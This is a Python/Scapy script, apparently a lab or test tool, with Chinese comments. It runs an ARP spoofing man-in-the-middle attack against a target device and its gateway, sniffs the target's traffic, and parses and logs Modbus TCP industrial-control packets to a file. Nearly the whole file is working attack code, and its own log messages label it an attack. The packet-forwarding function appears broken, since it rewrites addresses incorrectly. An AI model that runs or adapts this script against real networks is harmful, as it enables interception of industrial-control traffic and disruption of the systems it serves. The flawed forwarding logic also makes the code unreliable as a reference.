from scapy.all import *
import os
import time

def enable_ip_forwarding():
    """启用 IP 转发"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')

def disable_ip_forwarding():
    """禁用 IP 转发"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('0')

def send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface):
    """发送伪造的 ARP 包"""
    # 伪造网关到目标设备的 ARP 包
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=attacker_mac)
    send(packet, iface=iface, verbose=False)
    print(f"[INFO] ARP: {gateway_ip} ({attacker_mac}) -> {target_ip} ({target_mac})")

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    """恢复 ARP 表"""
    print("[INFO] 恢复 ARP 表...")
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3)
    print("[INFO] ARP 恢复完成")

def get_mac(ip):
    """获取目标设备的 MAC 地址"""
    ans, _ = srp(ARP(pdst=ip), timeout=2, verbose=False)
    for _, received in ans:
        return received.hwsrc
    return None

def forward_packet(packet, gateway_ip, attacker_mac, iface):
    """转发流量到网关"""
    if packet.haslayer(IP):
        # 修改源和目的地址，使其符合转发规则
        packet[IP].src = packet[IP].dst
        packet[IP].dst = gateway_ip
        del packet[IP].chksum  # 删除校验和以便重新计算
        send(packet, iface=iface, verbose=False)
        print(f"[INFO] 转发包: {packet[IP].src} -> {packet[IP].dst}")

def parse_modbus_tcp(packet):
    """解析 Modbus TCP 数据包"""
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        raw_data = packet[Raw].load
        # Modbus TCP 数据包的最小长度为 7 字节（包含 Modbus 事务ID、协议ID、长度等）
        if len(raw_data) >= 7:
            # Modbus TCP 数据结构解析（假设数据包从 Modbus TCP 头开始）
            transaction_id = raw_data[0:2]
            protocol_id = raw_data[2:4]
            length = raw_data[4:6]
            unit_id = raw_data[6]
            function_code = raw_data[7]

            # 提取功能码后面的数据部分（数据根据功能码不同而不同）
            data = raw_data[8:]

            # 输出 Modbus TCP 信息
            modbus_info = {
                'transaction_id': transaction_id.hex(),
                'protocol_id': protocol_id.hex(),
                'length': length.hex(),
                'unit_id': unit_id,
                'function_code': function_code,
                'data': data.hex()
            }

            return modbus_info
    return None

def save_modbus_data(modbus_info, file_path):
    """将 Modbus 数据保存到文件"""
    with open(file_path, 'a') as file:
        file.write(f"Transaction ID: {modbus_info['transaction_id']}\n")
        file.write(f"Protocol ID: {modbus_info['protocol_id']}\n")
        file.write(f"Length: {modbus_info['length']}\n")
        file.write(f"Unit ID: {modbus_info['unit_id']}\n")
        file.write(f"Function Code: {modbus_info['function_code']}\n")
        file.write(f"Data: {modbus_info['data']}\n")
        file.write("\n" + "="*40 + "\n")

def main():
    # 配置相关信息
    target_ip = "192.168.88.131"  # 替换为目标设备 IP
    gateway_ip = "192.168.88.134"   # 替换为网关 IP

    # 自动选择活动接口
    iface = conf.iface  # 使用 Scapy 自动选择活动的网络接口

    if iface is None:
        print("[ERROR] 未找到有效的网络接口")
        return

    # 获取 MAC 地址
    attacker_mac = get_if_hwaddr(iface)  # 本机 MAC 地址
    target_mac = getmacbyip(target_ip)  # 目标设备原始 MAC 地址
    gateway_mac = getmacbyip(gateway_ip)  # 网关 MAC 地址

    if target_mac is None or gateway_mac is None:
        print("[ERROR] 无法获取目标或网关的 MAC 地址")
        return

    print(f"[INFO] 目标 IP: {target_ip} ({target_mac})")
    print(f"[INFO] 网关 IP: {gateway_ip} ({gateway_mac})")
    print(f"[INFO] 攻击者 MAC: {attacker_mac}")

    # 保存 Modbus 数据的文件路径
    modbus_file_path = "modbus_traffic.txt"

    try:
        # 启用 IP 转发
        enable_ip_forwarding()

        print("[INFO] 开始 ARP 欺骗攻击 ...")

        # 启动包嗅探，劫持流量并转发
        while True:
            # 持续发送伪造的 ARP 包
            send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface)
            
            # 捕获从目标设备流出的数据包
            packet = sniff(count=1, filter=f"ip and src {target_ip} and tcp", iface=iface, timeout=2)
            if packet:
                # 解析 Modbus TCP 数据包
                modbus_info = parse_modbus_tcp(packet[0])
                if modbus_info:
                    print(f"[INFO] 捕获到 Modbus TCP 数据包：{modbus_info}")
                    # 保存 Modbus 数据到文件
                    save_modbus_data(modbus_info, modbus_file_path)

                # 转发流量
                forward_packet(packet[0], gateway_ip, attacker_mac, iface)

            time.sleep(2)  # 每隔 2 秒发送一次 ARP 欺骗包

    except KeyboardInterrupt:
        print("\n[INFO] 停止攻击...")
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)

    finally:
        # 禁用 IP 转发
        disable_ip_forwarding()

if __name__ == "__main__":
    main()
